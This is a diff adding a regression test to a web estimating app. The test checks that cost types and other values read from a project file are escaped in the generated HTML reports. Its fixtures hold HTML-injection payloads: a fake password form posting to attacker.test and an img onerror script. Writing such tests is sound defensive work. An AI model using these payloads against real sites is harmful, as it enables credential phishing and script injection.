@@ -46,6 +46,9 @@
 //      document's own Escape never takes him off the drawing he counts on.
 //      And where the bar is parked on an iPad: over the sheet, not the
 //      Items panel's head, and below the toolbars when they are pulled down.
+//  11. a file's words are printed, never made markup: a cost type, floor or
+//      category from the file is escaped in every report, and a row's class
+//      is one of the report's own two words.
 //
 // Run: node tests/revision-web-flow.mjs
 import { readFile } from 'node:fs/promises';
@@ -54,6 +57,7 @@ import { ToolController } from '../js/tools/controller.js';
 import { newestVersionOf, sheetVersions, versionItems } from '../js/core/revisions.js';
 import { CountingModel, takeoffMoveWords, deleteItemQuestion } from '../js/core/counting.js';
 import * as Reports from '../js/ui/reports.js';
+import * as H from '../js/ui/report-html.js';
 import { yesNoDialog } from '../js/ui/dialogs.js';
 import * as Dialogs from '../js/ui/dialogs.js';
 import { MARKUP_TOOLS } from '../js/tools/controller.js';
@@ -1280,6 +1284,56 @@ console.log('\n-- the Count bar --');
     heard.transitionend({ target: chromeEl, propertyName: 'box-shadow' });
     eq('...on the stack\'s own slide, and nothing else', placed, ['count']);
   }
+}
+
+// ═══ 11. a file's words are printed, never made markup ═════════════════════
+// A measurement's cost_type is whatever its file says, and the Report Center
+// puts the report into the page with innerHTML (the print window: with
+// document.write). Inside the portal that page is on the portal's own site.
+// The cost type once went raw into a class attribute: `x"><form …>` closed it
+// and drew a form of its own over the page. A row's class is one of two
+// words now, and every word of the file is escaped for an attribute too.
+console.log('\n-- a file\'s words in the reports --');
+{
+  const FORM = 'x"><form action="https://attacker.test/" target="_top"><input name=p type=password placeholder="Portal password">';
+  const IMG = "y'><img src=x onerror=alert(1)>";
+  const p = new Project();
+  p.loadFrom({
+    metadata: { page_labels: ['S1'] }, annotations: {}, pageCount: 1,
+    measurements: { 0: [
+      area('Wall "A"', 100, { cost_type: FORM, unit_cost: 2, floor_level: 'L1"><b>', category: "Trade'<i>",
+        associated_items: [{ name: 'Studs', cost_type: IMG, qty_per: 1, unit: 'each', unit_cost: 1 }] }),
+      area('Labor wall', 50, { cost_type: 'labor', unit_cost: 3 }),
+    ] },
+  });
+  const lbl = i => `S${i + 1}`;
+  eq('the reports know two cost types, whatever a file says (as the CSV and the workbook read it)',
+    collectItems(p, lbl, { costType: 'all' }).map(e => [e.name, e.costType, e.materials.map(m => m.costType)]),
+    [['Wall "A"', 'material', ['material']], ['Labor wall', 'labor', []]]);
+  eq('… so the cost filters find an odd one where the CSV puts it', [
+    collectItems(p, lbl, { costType: 'material' }).map(e => e.name),
+    collectItems(p, lbl, { costType: 'labor' }).map(e => e.name),
+  ], [['Wall "A"'], ['Labor wall']]);
+  const opts = { groupBy: 'ft', costs: true, notes: true, sheets: true, materials: true, subtotals: true };
+  for (const key of ['estimate', 'mto', 'labor', 'rollup', 'matlist']) {
+    const html = buildReportHtml(p, lbl, key, {}, opts);
+    const classes = [...html.matchAll(/\sclass="([^"]*)"/g)].map(m => m[1]);
+    const odd = classes.filter(c => !/^(?:rpt|sub|meta|n|band|sect|labor|material|floor|cat|sub1|sub2|grand|mat|note|dim|warn|\s)*$/.test(c));
+    eq(`${key}: every class is one of the report's own words`, odd, []);
+    ok(`${key}: nothing of the file became markup (no form, input, img, b or i of its own)`,
+      !/<(?:form|input|img|b|i)\b/i.test(html.replace(/<i>(?:Subtotal|No matching)[^<]*/g, '')),
+      html.slice(0, 600));
+    ok(`${key}: no attribute is closed by the file's words`, !/"><(?:form|img|b)/.test(html) && !/'><img/.test(html));
+  }
+  const est = buildReportHtml(p, lbl, 'estimate', {}, opts);
+  ok('the words are still there, as words', est.includes('Wall &quot;A&quot;') && est.includes('L1&quot;&gt;&lt;b&gt;'));
+  eq('esc escapes for an attribute as much as for text', H.esc(`a&b<c>d"e'f`), 'a&amp;b&lt;c&gt;d&quot;e&#39;f');
+  // groupedHtml on its own, handed raw items (another caller, later): the class is still one of two words.
+  const raw = H.groupedHtml([{ costType: IMG, name: 'n', qty: 1, unit: 'each', materials: [] }], { costs: false });
+  eq('groupedHtml draws an odd cost type as material, never as its own text',
+    [...raw.matchAll(/<tr class="([^"]*)"/g)].map(m => m[1]), ['band material', '', 'sect material', 'grand']);
+  eq('… and costClass / costTypeOf are the two words', [H.costClass('labor'), H.costClass(FORM), Reports.costTypeOf('labor'),
+    Reports.costTypeOf(undefined), Reports.costTypeOf(IMG)], ['labor', 'material', 'labor', 'material', 'material']);
 }
 
 console.log(fails ? `\n${fails} of ${checks} checks FAILED`
